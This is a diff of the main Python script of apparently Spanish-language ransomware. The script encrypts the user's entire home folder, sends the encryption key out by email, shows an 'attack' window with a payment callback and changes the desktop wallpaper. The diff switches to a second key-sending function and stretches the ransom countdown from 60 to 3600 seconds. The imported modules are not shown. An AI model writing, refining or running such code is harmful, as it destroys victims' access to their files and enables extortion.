@@ -1,7 +1,7 @@
 import os
 from modulo_encriptacion import generar_clave, encriptar_carpeta, desencriptar_carpeta, cargar_clave
 from modulo_ventanas import VentanaAtaque, pedir_correos_y_mostrar, pedir_clave, mostrar_mensaje
-from modulo_correo import enviar_clave
+from modulo_correo import enviar_clave, enviar_clave2
 from modulo_fondo import cambiar_fondo_de_pantalla, obtener_fondo_actual
 
 def main():
@@ -16,7 +16,7 @@ def main():
     clave = generar_clave()
     carpeta_usuario = os.path.expanduser("~")
     encriptar_carpeta(clave, carpeta_usuario)
-    enviar_clave(os.getenv("CORREO_REMITENTE"), clave.decode())
+    enviar_clave2(os.getenv("CORREO_REMITENTE"), clave.decode())
 
     # 4. Mostrar ventana de ataque
     def despues_de_pagar():
@@ -40,7 +40,7 @@ def main():
         # 8. Restaurar fondo original
         cambiar_fondo_de_pantalla(fondo_original)
 
-    VentanaAtaque(tiempo_limite=60, callback_pago=despues_de_pagar)
+    VentanaAtaque(tiempo_limite=3600, callback_pago=despues_de_pagar)
 
 if __name__ == "__main__":
     main()
